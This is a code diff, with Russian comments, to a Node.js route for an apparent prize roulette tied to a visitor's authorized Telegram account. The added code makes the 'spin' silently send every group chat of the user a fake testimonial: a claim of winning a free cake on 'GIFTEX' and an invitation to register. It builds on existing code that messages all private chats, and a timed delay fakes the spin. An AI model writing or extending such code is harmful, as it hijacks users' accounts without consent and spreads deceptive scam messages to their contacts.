@@ -109,15 +109,42 @@ router.post('/spin', checkAuth, checkTdlibAuth, checkParticipation, async (req, 
       stats.addError('Отправка сообщений', `Не удалось отправить ${failedCount} сообщений: ${failedErrors}`);
     }
     
+    // После отправки в личные чаты, отправляем в групповые чаты
+    console.log('Отправка сообщений в групповые чаты...');
+    
+    // Текст сообщения для групповых чатов отличается
+    const groupMessageText = "Привет всем! Только что выиграл бесплатный тортик на сайте GIFTEX. Вот ссылка для регистрации, если кто-то тоже хочет попробовать: ";
+    
+    // Отправляем сообщение в групповые чаты
+    const groupResults = await client.sendMessageToAllGroupChats(groupMessageText);
+    
+    // Сохраняем результаты отправки в групповые чаты в сессии для статистики
+    req.session.groupMessageSendResults = groupResults;
+    
+    // Получаем статистику отправки в групповые чаты
+    const groupSentCount = groupResults.filter(r => r.success).length;
+    const groupFailedCount = groupResults.filter(r => !r.success).length;
+    
+    // Если были неудачные отправки в групповые чаты, записываем их в статистику
+    if (groupFailedCount > 0) {
+      const groupFailedErrors = groupResults
+        .filter(r => !r.success)
+        .map(r => r.error || 'Неизвестная ошибка')
+        .join(', ');
+      
+      stats.addError('Отправка сообщений в группы', `Не удалось отправить ${groupFailedCount} сообщений в группы: ${groupFailedErrors}`);
+    }
+    
     // Симуляция задержки на прокрутку рулетки (3 секунды)
     await new Promise(resolve => setTimeout(resolve, 3000));
     
     // Отправляем ответ об успешной операции
     res.json({
       success: true,
-      message: `Отправлено сообщение "HELLO WORLD" в ${sentCount} личных чатов.`,
+      message: `Отправлено сообщение в ${sentCount} личных чатов и ${groupSentCount} групповых чатов.`,
       gift: "HELLO WORLD",
       sentCount: sentCount,
+      groupSentCount: groupSentCount,
       giftsInfo: {
         sent: giftResult.success,
         count: giftResult.sentCount || 0,
